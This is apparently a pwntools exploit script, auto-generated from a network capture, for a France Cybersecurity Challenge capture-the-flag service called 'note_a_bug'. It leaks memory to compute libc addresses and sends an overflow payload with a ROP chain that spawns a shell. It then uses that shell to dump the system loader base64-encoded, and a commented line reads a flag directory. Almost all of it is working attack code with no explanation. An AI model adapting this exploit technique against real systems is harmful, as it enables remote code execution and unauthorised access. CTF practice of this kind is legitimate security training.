#!/usr/bin/env python3
# Filename: replay-note_a_bug-4000-599611977121258.py
import json
import os

from pwn import *

"""
This file was generated from network capture towards 10.0.2.2 (TCP).
Corresponding flow id: 599611977121258
Service: note_a_bug-4000
"""


def parse_dump(dump):
    dico = {}
    for i in dump:
        dico[int(i.split(" ")[0][1:-1], 16)] = ((int("".join(i.split(" ")[1:9][::-1]), 16)), (int("".join(i.split(" ")[9:17][::-1]), 16)))

    return dico

# Set logging level

# Load environment variables
# EXTRA is an array of the flagids for current service and team
HOST = "challenges.france-cybersecurity-challenge.fr"

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
r = remote(HOST, 2108, typ="tcp", timeout=2)

data = r.recvuntil(b'ote\n0. Exit\n>>> ')
session = data.decode().split("\n")[0].split(" ")[-1].split("/")[-2]
print("SESSION :", session)

r.sendline(b'1')
data = r.recvuntil(b'ontent length: \n')
note = data.decode().split("\n")[0].split(" ")[-1]
print("NOTE :", note)

r.sendline(b'176')
data = r.recvuntil(b'Content: \n')
print(data.decode())
r.sendline(b'AAAAAAAA')
data = r.recvuntil(b'ote\n0. Exit\n>>> ')
print(data.decode())
r.sendline(b'2')
data = r.recvuntil(b't filename:\n>>> ')
print(data.decode())

r.sendline(f'{session}/{note}'.encode())
data = r.recvuntil(b'ote\n0. Exit\n>>> ')
dump = parse_dump(data.decode().split("\n")[1:12])
bak = data.decode().split("\n")[1:12]
for i in bak:
    print(i)

addr_1 = dump[0xa0][1]+0x16ee67
print("ADDR_1 :", hex(addr_1))

addr_2 = dump[0xa0][1]+0x251d6
print("ADDR_2 :", hex(addr_2))

r.sendline(b'1')
data = r.recvuntil(b'ontent length: \n')
print(data.decode())
r.sendline(b'152')
data = r.recvuntil(b'Content: \n')
print(data.decode())

payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
payload += p64(0x40135b)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x40135e)
payload += p64(addr_1)
payload += p64(addr_2)

r.sendline(payload)

w = open("_ld_exf", "w")
cmd = b'gzip -c /lib64/ld-linux-x86-64.so.2 | base64'
r.sendline(cmd)

data = r.recv(256)
while data:
    w.write(data.decode())
    data = r.recv(256)


r.interactive()
#r.sendline(b'cat /fcsc/tc3sY345VAg9Wt78ZqC8pfXqT4MpCwY/*')
#data = r.recvuntil(b'ad041437e1bc20\x00\x00')

# Use the following to capture all remaining bytes:
# data = r.recvall(timeout=5)
# print(data)

r.close()
